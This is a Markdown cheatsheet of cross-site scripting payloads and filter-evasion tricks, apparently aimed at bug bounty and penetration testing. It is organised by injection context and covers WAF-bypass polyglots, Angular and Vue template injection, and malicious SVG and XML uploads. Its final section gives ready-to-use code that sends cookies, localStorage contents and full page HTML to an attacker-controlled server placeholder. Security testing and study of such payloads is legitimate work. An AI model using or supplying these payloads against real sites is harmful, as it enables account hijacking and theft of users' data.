# 🛡️ Advanced XSS Payload & Bypass Cheatsheet

> **⚠️ Ethical Warning:** This list is for educational and authorized testing purposes only (e.g., Bug Bounties, Penetration Testing). Unauthorized use is illegal.

## 🎯 1. "Context is King" 

*XSS is useless if you don't know where you are landing. Choose the payload based on the injection point.*

### A. HTML Body Context (Standard)

*When input lands directly between tags like `<div>[INPUT]</div>`.*

```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<iframe/onload=alert(1)></iframe>
<ScRiPt>alert(1)</sCrIpT>
<scr%00ipt>alert(1)</script>

```

### B. Attribute Context

*When input lands inside a tag attribute: `<input value="[INPUT]">`.*

```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>

" onfocus=alert(1) autofocus "
" onmouseover=alert(1) "

javascript:alert(1)
java%09script:alert(1) javascript://%250Aalert(1) ```
```

## C. JavaScript Context
*When input lands inside a `<script>` block: `<script>var x = '[INPUT]';</script>`.*

```javascript
// 1. Break the string and the script tag (The Nuclear Option)
</script><script>alert(1)</script>

// 2. Break the string to execute code
'-alert(1)-'
";alert(1);"
\u0027;alert(1);// (Unicode escape for single quote)

// 3. Template Literal Injection (Backticks)
${alert(1)}
```

---

## 🚧 2. Filter & WAF Evasion

*When standard payloads are blocked by a firewall or sanitizer.*

### A. Whitespace & Separator Bypasses

*Browsers allow weird separators that WAFs often miss.*

```html
<svg/onload=alert(1)>
<svg///onload=alert(1)>
<img src=x onerror=alert(1)//>
<svg/onload=alert(1)</noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

```

**The "0xSobky" Polyglot:**

```text
javascript://%250Aalert(1)//"/*\'/*"/*--></title></style></textarea></script><svg/onload=alert(1)>

```

---

## ⚛️ 4. Modern Framework Injection (CSTI)

*For React, Vue, Angular, etc. These target the Template Engine, not just the HTML.*

### Angular (Modern & Legacy)

```javascript
// Angular 1.x (Legacy)
{{constructor.constructor('alert(1)')()}}

// Angular (Modern - generally requires a sanitization bypass or specific setup)
{{$on.constructor('alert(1)')()}}

```

### Vue.js

```javascript
// Vue 2.x
{{constructor.constructor('alert(1)')()}}

// Vue 3 (Mounting point injection)
<div v-html="'<img src=x onerror=alert(1)>'"></div>

```

### React

*React is secure by default. You are looking for `dangerouslySetInnerHTML` or vulnerable props.*

```javascript
// If you control props:
<a href={user_input}>Link</a> // user_input = "javascript:alert(1)"

```

---

## 📄 5. File Upload Vectors

*If you can upload a file, you can often trigger XSS.*

**SVG XSS (Save as `logo.svg`)**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(1);
   </script>
</svg>

```

**XML/XSLT (Save as `data.xml`)**
*Often overlooked in PDF generators or data parsers.*

```xml
<a xmlns:a="http://www.w3.org/1999/xhtml"><a:body onload="alert(1)"/></a>

```

---

## 🕵️ 6. Blind XSS & Data Exfiltration

*For when you don't see the alert box (e.g., admin panels, log viewers).*
*Use Burp Collaborator, Interactsh, or a custom server.*

```javascript
// 1. Basic Ping
<script src=http://YOUR_COLLABORATOR_ID></script>

// 2. Steal Cookies (The "Classic")
<script>fetch('https://YOUR_SERVER/?cookie=' + btoa(document.cookie))</script>

// 3. Steal LocalStorage (Modern Apps use this more than cookies)
<img src=x onerror='fetch("https://YOUR_SERVER/?ls="+btoa(JSON.stringify(localStorage)))'>

// 4. Exfiltrate full page HTML (See what the admin sees)
<script>
fetch('https://YOUR_SERVER/', {
  method: 'POST',
  body: document.documentElement.outerHTML
});
</script>

```
